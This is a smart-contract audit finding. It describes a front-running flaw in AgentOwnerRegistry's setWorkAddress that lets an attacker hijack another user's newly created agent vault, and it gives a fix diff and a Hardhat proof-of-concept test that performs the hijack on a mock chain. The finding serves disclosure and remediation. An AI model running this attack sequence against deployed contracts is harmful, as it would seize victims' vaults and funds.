# Low Risk Findings

## <a id='L-01'></a>L-01. Malicious user can hijack another user’s vault due to `setWorkAddress` allowing management address as work address



## Finding description and impact

In `contracts/agentOwnerRegistry/implementation/AgentOwnerRegistry.sol:AgentOwnerRegistry`, the `setWorkAddress` function allows one user’s management address to be registered as the work address of another user. This enables a malicious user to hijack another user’s vault.

Consider a malicious user B (with `managementAddressB`) and a legitimate user A (with `managementAddressA`). When A calls `createAgentVault` in `AgentVaultManagementFacet.sol:AgentVaultManagementFacet`, user B can front-run the transaction and call `setWorkAddress` with `_ownerWorkAddress = managementAddressA`.

This updates the mapping so that `workToMgmtAddress[managementAddressA] = managementAddressB`. Later, when `createAgentVault` is executed, `_getManagementAddress` resolves to B’s management address instead of A’s, causing the vault to be created under the attacker’s control.

Afterwards, B can restore his own work address by calling `setWorkAddress` again, ensuring that calls to `getWorkAddress` return his legitimate work address.

As a result, the attacker gains full control of the victim’s newly created vault and can claim the underlying address. This effectively enables vault hijacking and loss of ownership for the victim.

## Recommended mitigation steps

To prevent hijacking, management addresses should never be allowed as work addresses. One solution is adding a check to reject any `_ownerWorkAddress` that is itself a whitelisted management address.

```diff
    function setWorkAddress(address _ownerWorkAddress) external {
        require(isWhitelisted(msg.sender), AgentNotWhitelisted());
        require(
            _ownerWorkAddress == address(0) ||
                workToMgmtAddress[_ownerWorkAddress] == address(0),
            WorkAddressInUse()
        );
+       require(!isWhitelisted(_ownerWorkAddress), "Cannot set whitelisted management address as work address");
        // delete old work to management mapping
        address oldWorkAddress = mgmtToWorkAddress[msg.sender];
        if (oldWorkAddress != address(0)) {
            workToMgmtAddress[oldWorkAddress] = address(0);
        }
```

## Proof of Concept

Add the following file to `./test/integration` and run `yarn hardhat test --grep "Malicious user can hijack another user’s vault"`

```solidity
import { AssetContext } from "../../lib/test-utils/actors/AssetContext";
import { CommonContext } from "../../lib/test-utils/actors/CommonContext";
import { testChainInfo } from "../../lib/test-utils/actors/TestChainInfo";
import { MockChain } from "../../lib/test-utils/fasset/MockChain";
import { MockFlareDataConnectorClient } from "../../lib/test-utils/fasset/MockFlareDataConnectorClient";
import { createTestAgentSettings } from "../../lib/test-utils/test-settings";
import { getTestFile, loadFixtureCopyVars } from "../../lib/test-utils/test-suite-helpers";
import { requiredEventArgs } from "../../lib/utils/events/truffle";
import { web3DeepNormalize } from "../../lib/utils/web3normalize";

const AgentVault = artifacts.require('AgentVault');

contract(`PoC-template.ts; ${getTestFile(__filename)}; PoC tests`, accounts => {
    const governance = accounts[10];
    const agentOwner1 = accounts[20];
    const agentOwner2 = accounts[21];
    // addresses on mock underlying chain can be any string, as long as it is unique
    const underlyingAgent1 = "Agent1";

    let commonContext: CommonContext;
    let context: AssetContext;
    let mockChain: MockChain;
    let mockFlareDataConnectorClient: MockFlareDataConnectorClient;

    async function initialize() {
        commonContext = await CommonContext.createTest(governance);
        context = await AssetContext.createTest(commonContext, testChainInfo.eth);
        return { commonContext, context };
    }

    beforeEach(async () => {
        ({ commonContext, context } = await loadFixtureCopyVars(initialize));
        mockChain = context.chain as MockChain;
        mockFlareDataConnectorClient = context.flareDataConnectorClient as MockFlareDataConnectorClient;
    });

    it("Malicious user can hijack another user’s vault", async () => {
        // User A (legitimate)
        // A's Management Address: agentOwner1
        // A's Work Address: owner1WorkAddress
        // User B (malicious)
        // B's Management Address: agentOwner2
        // B's Work Address: owner2WorkAddress
        const owner1WorkAddress = accounts[22];
        const owner2WorkAddress = accounts[23];

        // User A sets work address
        await context.agentOwnerRegistry.whitelistAndDescribeAgent(agentOwner1, "Agent 1", "Agent 1 description", "Agent 1 icon url", "Agent 1 tou url", { from: governance });
        await context.agentOwnerRegistry.setWorkAddress(owner1WorkAddress, { from: agentOwner1 });

        // User B sets work address
        await context.agentOwnerRegistry.whitelistAndDescribeAgent(agentOwner2, "Agent 2", "Agent 2 description", "Agent 2 icon url", "Agent 2 tou url", { from: governance });
        await context.agentOwnerRegistry.setWorkAddress(owner2WorkAddress, { from: agentOwner2 });

        // User B front-runs by calling setWorkAddress with victim’s management address
        await context.agentOwnerRegistry.setWorkAddress(agentOwner1, { from: agentOwner2 });

        // Victim A creates a vault, but it resolves to attacker’s management address
        const addressValidityProof = await context.attestationProvider.proveAddressValidity(underlyingAgent1);
        assert.isTrue(addressValidityProof.data.responseBody.isValid);
        const agentSettings = createTestAgentSettings(context.usdc.address);
        const response = await context.assetManager.createAgentVault(web3DeepNormalize(addressValidityProof), web3DeepNormalize(agentSettings), { from: agentOwner1 });
        const created = requiredEventArgs(response, 'AgentVaultCreated');
        const agentVault = await AgentVault.at(created.agentVault);

        // Attacker resets his work address to finalize control
        await context.agentOwnerRegistry.setWorkAddress(owner2WorkAddress, { from: agentOwner2 });

        // Check – vault belongs to attacker
        const info = await context.assetManager.getAgentInfo(agentVault.address);
        assert.equal(info.ownerManagementAddress, agentOwner2);
        assert.equal(info.ownerWorkAddress, owner2WorkAddress);
        assert.equal(await agentVault.isOwner(agentOwner2), true);
        assert.equal(await agentVault.isOwner(agentOwner1), false);
    });

});
```
